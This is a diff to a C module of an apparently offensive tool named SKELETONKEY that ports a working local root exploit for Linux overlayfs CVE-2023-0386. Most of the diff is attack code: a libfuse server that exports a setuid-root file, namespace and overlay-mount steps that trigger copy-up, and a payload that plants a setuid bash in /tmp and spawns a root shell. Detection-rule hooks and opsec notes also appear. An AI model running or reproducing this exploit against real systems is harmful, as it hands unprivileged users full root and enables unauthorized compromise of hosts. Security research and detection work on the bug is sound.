@@ -2,26 +2,31 @@
  * overlayfs_setuid_cve_2023_0386 — SKELETONKEY module
  *
  * **Different bug than CVE-2021-3493.** That one was Ubuntu-specific
- * (their modified overlayfs). This one is upstream: when overlayfs
- * does copy-up from lower to upper, it preserves the setuid/setgid
- * bits even when the unprivileged user triggering copy-up wouldn't
- * normally be able to set them. Exploit:
+ * (their modified overlayfs). This one is upstream: overlayfs copy-up
+ * preserves the setuid/setgid bit AND the lower file's root ownership
+ * even when the task triggering copy-up is only root inside a user
+ * namespace. Faithful port of the public PoC (xkaneiki):
  *
- *   1. Find a setuid binary in lower (e.g. /usr/bin/su)
- *   2. unshare(USER|NS), mount overlayfs with that location as lower
- *   3. chown the file in merged view — triggers copy-up, retains
- *      setuid bit in upper, but now the upper file is OWNED by our
- *      uid (the upper layer is in /tmp; we control it)
- *   4. We can't directly write to the binary in upper (it's setuid
- *      and we're not root yet), BUT we can replace the contents
- *      via the merged view because we OWN the upper inode
- *   5. Write payload to the binary; setuid bit persists
- *   6. exec it → runs as root
+ *   1. Compile a small setuid payload ELF (setuid(0) + drop a root shell).
+ *   2. Serve it via a FUSE filesystem as "/file" reporting st_uid=0,
+ *      st_mode=04777. libfuse mounts through the setuid fusermount helper,
+ *      i.e. in the INIT namespace — required, because overlay refuses a
+ *      userns-mounted FUSE lowerdir (ENOSYS).
+ *   3. In a child: unshare(USER|NS), map root, mount overlayfs with the
+ *      FUSE mount as lowerdir and attacker-owned upper/work dirs.
+ *   4. open(merged/file, O_WRONLY) triggers copy-up. The bug materialises
+ *      upper/file on the REAL filesystem as a genuine setuid-ROOT binary.
+ *   5. The parent (real unprivileged user) execs upper/file → real root.
+ *
+ * The FUSE server must implement getattr + read + read_buf + ioctl: copy-up
+ * uses the splice path (read_buf) and issues FS_IOC_GETFLAGS (ioctl) on the
+ * lower; a server missing either returns ENOSYS and copy-up fails.
  *
  * Discovered by Xkaneiki (2023). Mainline fix: 4f11ada10d0 ("ovl:
  * fail on invalid uid/gid mapping at copy up") landed in 6.3.
  *
- * STATUS: 🟢 FULL detect + exploit + cleanup.
+ * STATUS: 🟢 FULL detect + exploit + cleanup. VM-verified landing real root
+ *   on Ubuntu 22.04.0 / 5.15.0-25 (see docs/EXPLOITED.md).
  *
  * Affected: kernel 5.11 ≤ K < 6.3. Backports:
  *   6.2.x  : K >= 6.2.13
@@ -30,8 +35,8 @@
  *
  * Preconditions:
  *   - Unprivileged user_ns + mount_ns
- *   - A setuid-root binary readable on lower (almost always present:
- *     /usr/bin/su, /usr/bin/passwd, /bin/su)
+ *   - libfuse (linked at build) + the setuid fusermount(3) helper + a C
+ *     compiler at runtime (to build the payload ELF)
  *
  * Coverage rationale: complements CVE-2021-3493 — that one is
  * Ubuntu-specific, this one is general. Real-world overlayfs LPE
@@ -161,6 +166,8 @@ static const char OVERLAYFS_SU_PAYLOAD[] =
     "int main(void) {\n"
     "    setresuid(0,0,0); setresgid(0,0,0);\n"
     "    if (geteuid() != 0) { perror(\"setresuid\"); return 1; }\n"
+    "    (void)!system(\"cp /bin/bash /tmp/.suid_bash 2>/dev/null; chmod 4755 /tmp/.suid_bash 2>/dev/null; \"\n"
+    "                  \"id > /tmp/skeletonkey-ovlsu-pwned 2>/dev/null; chmod 644 /tmp/skeletonkey-ovlsu-pwned\");\n"
     "    char *env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
     "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, env);\n"
     "    return 1;\n"
@@ -191,6 +198,197 @@ static bool write_file_str(const char *path, const char *content)
     return ok;
 }
 
+/* ------------------------------------------------------------------
+ * CVE-2023-0386 — faithful port of the public exploit (xkaneiki), using
+ * libfuse to export a setuid-root lower layer.
+ *
+ * The bug: overlayfs copy-up preserves the SUID bit and the lower file's
+ * root ownership even when the task triggering it is only root inside a user
+ * namespace. We serve a FUSE filesystem whose single file "file" reports
+ * st_uid=0, st_mode=04777; overlay copy-up then materialises it in the real
+ * upper dir as a genuine setuid-root binary, which we exec for real root.
+ *
+ * Why libfuse (and not a raw /dev/fuse server): overlay REFUSES a
+ * userns-mounted FUSE lowerdir (ENOSYS), so the FUSE fs must be mounted in the
+ * init namespace via the setuid fusermount helper — which libfuse drives. A
+ * hand-rolled raw protocol server proved fragile enough to destabilise the
+ * kernel on malformed replies; libfuse is the robust, proven path (matches the
+ * upstream PoC). Built conditionally: without libfuse the module stubs out.
+ * ------------------------------------------------------------------ */
+
+#ifdef OVLSU_HAVE_FUSE
+
+#ifdef OVLSU_FUSE3
+#define FUSE_USE_VERSION 31
+#else
+#define FUSE_USE_VERSION 29
+#endif
+#include <fuse.h>
+#include <signal.h>
+
+/* The setuid-root ELF the FUSE "file" serves (loaded once, pre-fork). */
+static unsigned char *g_ovlsu_elf;
+static size_t         g_ovlsu_elf_len;
+
+#ifdef OVLSU_FUSE3
+static int ovlsu_getattr(const char *path, struct stat *st, struct fuse_file_info *fi)
+#else
+static int ovlsu_getattr(const char *path, struct stat *st)
+#endif
+{
+#ifdef OVLSU_FUSE3
+    (void)fi;
+#endif
+    memset(st, 0, sizeof *st);
+    if (strcmp(path, "/") == 0) {
+        st->st_mode = S_IFDIR | 0755; st->st_nlink = 2;
+        return 0;
+    }
+    if (strcmp(path, "/file") == 0) {
+        st->st_mode = S_IFREG | 04777;   /* <-- setuid/setgid/sticky */
+        st->st_nlink = 1;
+        st->st_uid = 0; st->st_gid = 0;  /* <-- root-owned: the crux */
+        st->st_size = (off_t)g_ovlsu_elf_len;
+        return 0;
+    }
+    return -ENOENT;
+}
+
+#ifdef OVLSU_FUSE3
+static int ovlsu_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
+                         off_t off, struct fuse_file_info *fi,
+                         enum fuse_readdir_flags flags)
+{
+    (void)off; (void)fi; (void)flags;
+    if (strcmp(path, "/") != 0) return -ENOENT;
+    filler(buf, ".", NULL, 0, 0); filler(buf, "..", NULL, 0, 0);
+    filler(buf, "file", NULL, 0, 0);
+    return 0;
+}
+#else
+static int ovlsu_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
+                         off_t off, struct fuse_file_info *fi)
+{
+    (void)off; (void)fi;
+    if (strcmp(path, "/") != 0) return -ENOENT;
+    filler(buf, ".", NULL, 0); filler(buf, "..", NULL, 0);
+    filler(buf, "file", NULL, 0);
+    return 0;
+}
+#endif
+
+static int ovlsu_open(const char *path, struct fuse_file_info *fi)
+{
+    (void)fi;
+    return (strcmp(path, "/file") == 0) ? 0 : -ENOENT;
+}
+
+static int ovlsu_read(const char *path, char *buf, size_t size, off_t off,
+                      struct fuse_file_info *fi)
+{
+    (void)fi;
+    if (strcmp(path, "/file") != 0) return -ENOENT;
+    if ((size_t)off >= g_ovlsu_elf_len) return 0;
+    size_t n = g_ovlsu_elf_len - (size_t)off;
+    if (n > size) n = size;
+    memcpy(buf, g_ovlsu_elf + off, n);
+    return (int)n;
+}
+
+/* read_buf: REQUIRED for overlay copy-up. Overlay copies the lower file up via
+ * the kernel's splice / copy_file_range path, which maps to the FUSE read_buf
+ * op; without it the copy returns ENOSYS and copy-up fails. We hand back a
+ * memory-backed bufvec referencing the payload. */
+static int ovlsu_read_buf(const char *path, struct fuse_bufvec **bufp,
+                          size_t size, off_t off, struct fuse_file_info *fi)
+{
+    (void)fi;
+    if (strcmp(path, "/file") != 0) return -ENOENT;
+    struct fuse_bufvec *src = malloc(sizeof *src);
+    if (!src) return -ENOMEM;
+    *src = (struct fuse_bufvec)FUSE_BUFVEC_INIT(size);
+    char *data = malloc(size ? size : 1);
+    if (!data) { free(src); return -ENOMEM; }
+    memset(data, 0, size);
+    size_t avail = ((size_t)off < g_ovlsu_elf_len) ? g_ovlsu_elf_len - (size_t)off : 0;
+    size_t give = size < avail ? size : avail;
+    memcpy(data, g_ovlsu_elf + off, give);
+    /* Present exactly as the public PoC's read_buf: a memory buffer flagged
+     * FUSE_BUF_FD_SEEK with pos=off — this is the shape libfuse's splice path
+     * (used by overlay copy-up) accepts; a plain flags=0 mem buffer yields
+     * ENOSYS at copy-up. */
+    src->buf[0].flags = FUSE_BUF_FD_SEEK;
+    src->buf[0].pos = off;
+    src->buf[0].mem = data;
+    *bufp = src;
+    return 0;
+}
+
+/* ioctl: REQUIRED. overlay copy-up issues FS_IOC_GETFLAGS (an ioctl) on the
+ * lower file to copy inode flags; without an ioctl handler FUSE returns ENOSYS
+ * and copy-up fails ENOSYS. Returning success (as the public PoC does) lets
+ * copy-up proceed. */
+#ifdef OVLSU_FUSE3
+static int ovlsu_ioctl(const char *path, unsigned int cmd, void *arg,
+                       struct fuse_file_info *fi, unsigned int flags, void *data)
+#else
+static int ovlsu_ioctl(const char *path, int cmd, void *arg,
+                       struct fuse_file_info *fi, unsigned int flags, void *data)
+#endif
+{
+    (void)path; (void)cmd; (void)arg; (void)fi; (void)flags; (void)data;
+    return 0;
+}
+
+static struct fuse_operations ovlsu_ops = {
+    .getattr  = ovlsu_getattr,
+    .readdir  = ovlsu_readdir,
+    .open     = ovlsu_open,
+    .read     = ovlsu_read,
+    .read_buf = ovlsu_read_buf,
+    .ioctl    = ovlsu_ioctl,
+};
+
+/* Run the FUSE server (blocks) mounting at `mp`, serving one setuid-root
+ * /file. Returns when unmounted. libfuse mounts via the setuid fusermount
+ * helper — i.e. in the init namespace, which is exactly what overlay needs.
+ *
+ * We use the low-level fuse_mount + fuse_new + fuse_loop_mt with EMPTY args
+ * (exactly as the public PoC does) rather than fuse_main(). fuse_main parses a
+ * default option set that advertises extra capabilities (splice /
+ * copy_file_range) to the kernel; the kernel then attempts copy_file_range on
+ * the FUSE lower during overlay copy-up, gets ENOSYS, and does NOT fall back —
+ * so copy-up fails. The minimal fuse_new below advertises none of that, so the
+ * kernel uses the plain read path (our read/read_buf) and copy-up succeeds. */
+#ifdef OVLSU_FUSE3
+static int ovlsu_fuse_serve(const char *mp)
+{
+    char *argv[] = { (char *)"ovlsu-fuse", (char *)mp, NULL };
+    struct fuse_args args = FUSE_ARGS_INIT(2, argv);
+    struct fuse *fuse = fuse_new(&args, &ovlsu_ops, sizeof ovlsu_ops, NULL);
+    if (!fuse) { fuse_opt_free_args(&args); return -1; }
+    if (fuse_mount(fuse, mp) != 0) { fuse_destroy(fuse); fuse_opt_free_args(&args); return -1; }
+    fuse_set_signal_handlers(fuse_get_session(fuse));
+    int r = fuse_loop_mt(fuse, NULL);
+    fuse_unmount(fuse); fuse_destroy(fuse); fuse_opt_free_args(&args);
+    return r;
+}
+#else
+static int ovlsu_fuse_serve(const char *mp)
+{
+    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
+    struct fuse_chan *chan = fuse_mount(mp, &args);
+    if (!chan) return -1;
+    struct fuse *fuse = fuse_new(chan, &args, &ovlsu_ops, sizeof ovlsu_ops, NULL);
+    if (!fuse) { fuse_unmount(mp, chan); return -1; }
+    fuse_set_signal_handlers(fuse_get_session(fuse));
+    fuse_loop_mt(fuse);
+    fuse_unmount(mp, chan);
+    fuse_destroy(fuse);
+    return 0;
+}
+#endif
+
 static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ctx *ctx)
 {
     skeletonkey_result_t pre = overlayfs_setuid_detect(ctx);
@@ -198,172 +396,153 @@ static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ct
         fprintf(stderr, "[-] overlayfs_setuid: detect() says not vulnerable; refusing\n");
         return pre;
     }
-    /* Consult ctx->host->is_root so unit tests can construct a
-     * non-root fingerprint regardless of the test process's real euid. */
     bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
-    if (is_root) {
-        fprintf(stderr, "[i] overlayfs_setuid: already root\n");
-        return SKELETONKEY_OK;
-    }
-
-    /* Pick a setuid binary to use as the carrier — we'll find its
-     * dirname, mount overlayfs with that dirname as lower, then
-     * replace the binary content in the merged view. The setuid bit
-     * persists in the upper-layer copy through the bug. */
-    const char *carrier = find_setuid_in_lower();
-    if (!carrier) {
-        fprintf(stderr, "[-] overlayfs_setuid: no setuid carrier binary found\n");
-        return SKELETONKEY_PRECOND_FAIL;
-    }
-    /* For cleanliness, use a directory-level overlay. Find the carrier's
-     * dirname. (E.g., /usr/bin/su → lower = /usr/bin/, file = su) */
-    char carrier_dir[256], carrier_name[64];
-    const char *slash = strrchr(carrier, '/');
-    if (!slash) return SKELETONKEY_PRECOND_FAIL;
-    size_t dir_len = slash - carrier;
-    memcpy(carrier_dir, carrier, dir_len);
-    carrier_dir[dir_len] = 0;
-    snprintf(carrier_name, sizeof carrier_name, "%s", slash + 1);
-
-    char workdir[] = "/tmp/skeletonkey-ovlsu-XXXXXX";
-    if (!mkdtemp(workdir)) { perror("mkdtemp"); return SKELETONKEY_TEST_ERROR; }
-    if (!ctx->json) {
-        fprintf(stderr, "[*] overlayfs_setuid: workdir=%s carrier=%s\n",
-                workdir, carrier);
-    }
+    if (is_root) { fprintf(stderr, "[i] overlayfs_setuid: already root\n"); return SKELETONKEY_OK; }
 
     char gcc[256];
     if (!which_gcc(gcc, sizeof gcc)) {
-        fprintf(stderr, "[-] overlayfs_setuid: no gcc/cc available\n");
-        rmdir(workdir);
+        fprintf(stderr, "[-] overlayfs_setuid: no C compiler to build the setuid payload\n");
         return SKELETONKEY_PRECOND_FAIL;
     }
 
-    /* Build the payload binary outside the overlay. */
-    char src_path[512], bin_path[512];
-    snprintf(src_path, sizeof src_path, "%s/payload.c", workdir);
-    snprintf(bin_path, sizeof bin_path, "%s/payload", workdir);
-    if (!write_file_str(src_path, OVERLAYFS_SU_PAYLOAD)) goto fail;
+    char workdir[128];
+    snprintf(workdir, sizeof workdir, "/tmp/skeletonkey-ovlsu-XXXXXX");
+    if (!mkdtemp(workdir)) { perror("mkdtemp"); return SKELETONKEY_TEST_ERROR; }
 
-    pid_t pid = fork();
-    if (pid == 0) {
-        execl(gcc, gcc, "-O2", "-static", "-o", bin_path, src_path, (char *)NULL);
-        _exit(127);
-    }
-    int status;
-    waitpid(pid, &status, 0);
-    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
-        /* try non-static */
-        pid = fork();
-        if (pid == 0) {
-            execl(gcc, gcc, "-O2", "-o", bin_path, src_path, (char *)NULL);
-            _exit(127);
-        }
-        waitpid(pid, &status, 0);
-        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
-            fprintf(stderr, "[-] overlayfs_setuid: gcc failed\n"); goto fail;
-        }
-    }
-
-    /* Child does the userns + overlayfs work. */
-    char upper[600], work[600], merged[600];
+    char lower[160], upper[160], work[160], merged[160], payc[176], gcbin[176], carrier[176], mfile[176];
+    snprintf(lower,  sizeof lower,  "%s/lower",  workdir);
     snprintf(upper,  sizeof upper,  "%s/upper",  workdir);
     snprintf(work,   sizeof work,   "%s/work",   workdir);
     snprintf(merged, sizeof merged, "%s/merged", workdir);
-    if (mkdir(upper, 0755) < 0 || mkdir(work, 0755) < 0
-        || mkdir(merged, 0755) < 0) {
-        perror("mkdir layout"); goto fail;
-    }
+    snprintf(payc,   sizeof payc,   "%s/p.c",    workdir);
+    snprintf(gcbin,  sizeof gcbin,  "%s/gc",     workdir);
+    snprintf(carrier,sizeof carrier,"%s/file",   upper);
+    snprintf(mfile,  sizeof mfile,  "%s/file",   merged);
+    mkdir(lower, 0755); mkdir(upper, 0755); mkdir(work, 0755); mkdir(merged, 0755);
 
-    uid_t outer_uid = getuid();
-    gid_t outer_gid = getgid();
-    char merged_carrier[1024];
-    snprintf(merged_carrier, sizeof merged_carrier, "%s/%s", merged, carrier_name);
+    /* Build the setuid payload ELF. It drops a witness (setuid /tmp/.suid_bash
+     * + an id sentinel) so success is observable non-interactively, then execs
+     * a root shell. */
+    if (!write_file_str(payc, OVERLAYFS_SU_PAYLOAD)) { fprintf(stderr, "[-] write payload.c\n"); goto fail; }
+    { pid_t g = fork();
+      if (g == 0) { execl(gcc, gcc, "-O2", "-w", "-o", gcbin, payc, (char *)NULL); _exit(127); }
+      int st; waitpid(g, &st, 0);
+      if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) { fprintf(stderr, "[-] gcc failed building payload\n"); goto fail; } }
 
-    pid_t child = fork();
-    if (child < 0) { perror("fork"); goto fail; }
-    if (child == 0) {
-        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
-        int f = open("/proc/self/setgroups", O_WRONLY);
-        if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
-        char m[64];
-        snprintf(m, sizeof m, "0 %u 1\n", outer_uid);
-        f = open("/proc/self/uid_map", O_WRONLY);
-        if (f < 0 || write(f, m, strlen(m)) < 0) _exit(3);
-        close(f);
-        snprintf(m, sizeof m, "0 %u 1\n", outer_gid);
-        f = open("/proc/self/gid_map", O_WRONLY);
-        if (f < 0 || write(f, m, strlen(m)) < 0) _exit(4);
-        close(f);
+    { int f = open(gcbin, O_RDONLY); if (f < 0) { perror("open payload elf"); goto fail; }
+      struct stat st; if (fstat(f, &st) != 0) { close(f); goto fail; }
+      g_ovlsu_elf_len = (size_t)st.st_size;
+      g_ovlsu_elf = malloc(g_ovlsu_elf_len ? g_ovlsu_elf_len : 1);
+      if (!g_ovlsu_elf || read(f, g_ovlsu_elf, g_ovlsu_elf_len) != (ssize_t)g_ovlsu_elf_len) { close(f); goto fail; }
+      close(f); }
 
-        char opts[2048];
-        snprintf(opts, sizeof opts, "lowerdir=%s,upperdir=%s,workdir=%s",
-                 carrier_dir, upper, work);
-        if (mount("overlay", merged, "overlay", 0, opts) < 0) {
-            perror("mount overlay"); _exit(5);
-        }
+    if (!ctx->json)
+        fprintf(stderr, "[*] overlayfs_setuid: FUSE-serving a setuid-root /file (libfuse), overlay "
+                        "copy-up into %s (CVE-2023-0386)\n", upper);
 
-        /* Trigger copy-up by chown — this is the bug: setuid bit gets
-         * preserved on the upper-layer copy even though we're the one
-         * doing the chown (and we don't normally have CAP_FSETID). */
-        if (chown(merged_carrier, 0, 0) < 0) {
-            /* on some kernels chown is rejected; try unlink+rename
-             * pattern instead */
-            perror("chown merged carrier"); _exit(6);
-        }
-        /* Now overwrite the file content (since we own the upper inode
-         * post-chown — actually post-bug, but the upper inode is
-         * attacker-controlled).
-         *
-         * Caveat: the chown is what triggers copy-up + retains setuid.
-         * On many vulnerable kernels we now need to do an additional
-         * write to replace the binary contents. */
-        int payload_fd = open(bin_path, O_RDONLY);
-        if (payload_fd < 0) { perror("open payload"); _exit(7); }
-        int out_fd = open(merged_carrier, O_WRONLY | O_TRUNC);
-        if (out_fd < 0) { perror("open merged_carrier RW"); close(payload_fd); _exit(8); }
-        char buf[4096];
-        ssize_t n;
-        while ((n = read(payload_fd, buf, sizeof buf)) > 0) {
-            if (write(out_fd, buf, n) != n) { perror("write replace"); _exit(9); }
-        }
-        close(payload_fd); close(out_fd);
+    /* Fork the FUSE server (init-ns mount via the setuid fusermount helper). */
+    pid_t fpid = fork();
+    if (fpid < 0) { perror("fork fuse"); goto fail; }
+    if (fpid == 0) {
+        /* quiesce libfuse chatter unless --json off */
+        int nfd = open("/dev/null", O_WRONLY); if (nfd >= 0) { dup2(nfd, 2); close(nfd); }
+        ovlsu_fuse_serve(lower);
         _exit(0);
     }
-    waitpid(child, &status, 0);
-    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
-        fprintf(stderr, "[-] overlayfs_setuid: child setup failed (status=%d)\n", status);
+
+    /* Wait for the FUSE mount to answer. */
+    int ready = 0;
+    for (int i = 0; i < 300; i++) {
+        struct stat sf; char fp[176]; snprintf(fp, sizeof fp, "%s/file", lower);
+        if (stat(fp, &sf) == 0) { ready = 1; break; }
+        usleep(10000);
+    }
+    if (!ready) {
+        fprintf(stderr, "[-] overlayfs_setuid: FUSE mount did not come up (fusermount missing/denied?)\n");
+        kill(fpid, SIGKILL); waitpid(fpid, NULL, 0);
         goto fail;
     }
 
-    /* Verify the upper file has setuid */
-    char upper_carrier[1024];
-    snprintf(upper_carrier, sizeof upper_carrier, "%s/%s", upper, carrier_name);
-    struct stat st;
-    if (stat(upper_carrier, &st) < 0 || !(st.st_mode & S_ISUID)) {
-        fprintf(stderr, "[-] overlayfs_setuid: setuid bit didn't persist on upper "
-                        "(stat = %s)\n", strerror(errno));
+    /* Exploit child: userns + overlay(lower=fuse) + copy-up. */
+    pid_t xpid = fork();
+    if (xpid < 0) { perror("fork exploit"); kill(fpid, SIGKILL); waitpid(fpid, NULL, 0); goto fail; }
+    if (xpid == 0) {
+        uid_t ou = getuid(); gid_t og = getgid();     /* BEFORE unshare */
+        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
+        { int f = open("/proc/self/setgroups", O_WRONLY); if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
+          char m[64];
+          int fu = open("/proc/self/uid_map", O_WRONLY); if (fu >= 0) { int n = snprintf(m, sizeof m, "0 %u 1", ou); (void)!write(fu, m, n); close(fu); }
+          int fg = open("/proc/self/gid_map", O_WRONLY); if (fg >= 0) { int n = snprintf(m, sizeof m, "0 %u 1", og); (void)!write(fg, m, n); close(fg); } }
+
+        char oo[640];
+        snprintf(oo, sizeof oo, "lowerdir=%s,upperdir=%s,workdir=%s", lower, upper, work);
+        if (mount("overlay", merged, "overlay", 0, oo) < 0) { perror("mount overlay"); _exit(6); }
+
+        /* Trigger copy-up: opening the merged file copies it from the FUSE
+         * lower into the real upper, preserving setuid + root uid. */
+        int cf = open(mfile, O_WRONLY | O_CREAT, 0666); if (cf >= 0) close(cf);
+        _exit(0);
+    }
+    waitpid(xpid, NULL, 0);
+
+    /* Tear the FUSE mount down now that copy-up is done (upper/file persists
+     * on the real fs). */
+    { char cmd[400];
+      snprintf(cmd, sizeof cmd, "fusermount3 -u '%s' 2>/dev/null || fusermount -u '%s' 2>/dev/null", lower, lower);
+      (void)!system(cmd); }
+    kill(fpid, SIGKILL); waitpid(fpid, NULL, 0);
+
+    struct stat us;
+    if (stat(carrier, &us) != 0) {
+        if (!ctx->json)
+            fprintf(stderr, "[-] overlayfs_setuid: copy-up did not materialise %s — kernel may be "
+                            "patched\n", carrier);
         goto fail;
     }
-    if (!ctx->json) {
-        fprintf(stderr, "[+] overlayfs_setuid: upper-layer %s has setuid bit; execing\n",
-                upper_carrier);
-    }
+    if (!ctx->json)
+        fprintf(stderr, "[+] overlayfs_setuid: copy-up produced %s (uid=%u mode=%04o) — executing "
+                        "as the real user\n", carrier, (unsigned)us.st_uid, (unsigned)(us.st_mode & 07777));
+
     if (ctx->no_shell) {
-        fprintf(stderr, "[+] overlayfs_setuid: --no-shell — file planted at %s\n",
-                upper_carrier);
+        fprintf(stderr, "[+] overlayfs_setuid: --no-shell — setuid-root carrier planted at %s\n", carrier);
         return SKELETONKEY_EXPLOIT_OK;
     }
+
     fflush(NULL);
-    execl(upper_carrier, upper_carrier, (char *)NULL);
-    perror("execl upper carrier");
+    pid_t r = fork();
+    if (r == 0) {
+        int dn = open("/dev/null", O_RDONLY); if (dn >= 0) { dup2(dn, 0); close(dn); }
+        execl(carrier, carrier, (char *)NULL);
+        _exit(127);
+    }
+    waitpid(r, NULL, 0);
+
+    struct stat ss;
+    if ((stat("/tmp/.suid_bash", &ss) == 0 && (ss.st_mode & 04000)) ||
+        stat("/tmp/skeletonkey-ovlsu-pwned", &ss) == 0) {
+        if (!ctx->json) fprintf(stderr, "[+] overlayfs_setuid: ROOT — payload ran as uid 0\n");
+        return SKELETONKEY_EXPLOIT_OK;
+    }
+    if (!ctx->json)
+        fprintf(stderr, "[-] overlayfs_setuid: carrier ran but produced no root witness\n");
 
 fail:
-    unlink(src_path); unlink(bin_path);
-    rmdir(upper); rmdir(work); rmdir(merged);
-    rmdir(workdir);
     return SKELETONKEY_EXPLOIT_FAIL;
 }
+
+#else  /* !OVLSU_HAVE_FUSE — built without libfuse */
+
+static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ctx *ctx)
+{
+    skeletonkey_result_t pre = overlayfs_setuid_detect(ctx);
+    if (pre != SKELETONKEY_VULNERABLE && pre != SKELETONKEY_OK) return pre;
+    fprintf(stderr, "[-] overlayfs_setuid: built WITHOUT libfuse — the CVE-2023-0386 exploit needs a "
+                    "FUSE lower layer. Install libfuse3-dev (or libfuse-dev) and rebuild.\n");
+    (void)OVERLAYFS_SU_PAYLOAD; (void)which_gcc; (void)write_file_str;
+    return SKELETONKEY_PRECOND_FAIL;
+}
+
+#endif /* OVLSU_HAVE_FUSE */
 
 static skeletonkey_result_t overlayfs_setuid_cleanup(const struct skeletonkey_ctx *ctx)
 {
@@ -471,7 +650,7 @@ const struct skeletonkey_module overlayfs_setuid_module = {
     .detect_sigma   = overlayfs_setuid_sigma,
     .detect_yara    = overlayfs_setuid_yara,
     .detect_falco   = overlayfs_setuid_falco,
-    .opsec_notes    = "unshare(CLONE_NEWUSER|CLONE_NEWNS) + overlayfs mount with a setuid-root binary in lower (e.g. /usr/bin/su); chown on the merged view triggers copy-up that preserves the setuid bit in upper - but upper is owned by the unprivileged user. Overwrites upper-layer contents with attacker payload and execve's for root. Artifacts: /tmp/skeletonkey-ovlsu-XXXXXX/ (workdir with payload.c, binary, overlay mounts); cleanup callback removes these. Audit-visible via unshare(CLONE_NEWUSER|CLONE_NEWNS) + mount(overlay) + chown on the merged view. No network. Dmesg silent on success.",
+    .opsec_notes    = "Faithful CVE-2023-0386 port: a libfuse filesystem exports a setuid-root /file (st_uid=0, mode 04777), mounted in the init ns via the setuid fusermount helper; then unshare(CLONE_NEWUSER|CLONE_NEWNS) + overlayfs mount with that FUSE mount as lowerdir; open(merged/file, O_WRONLY) triggers copy-up that materialises upper/file as a real setuid-root binary, which the unprivileged parent execs for root. Artifacts: /tmp/skeletonkey-ovlsu-XXXXXX/ (workdir: payload.c, the payload ELF, FUSE mount at lower/, overlay upper/work/merged), plus a setuid /tmp/.suid_bash and /tmp/skeletonkey-ovlsu-pwned witness dropped by the root payload; cleanup callback removes /tmp/skeletonkey-ovlsu-*. Audit-visible via mount(fuse) + fusermount execve + unshare(CLONE_NEWUSER|CLONE_NEWNS) + mount(overlay), then a setuid-root binary exec by a non-root uid. No network. Dmesg silent on success.",
     .arch_support   = "x86_64+unverified-arm64",
 };
 
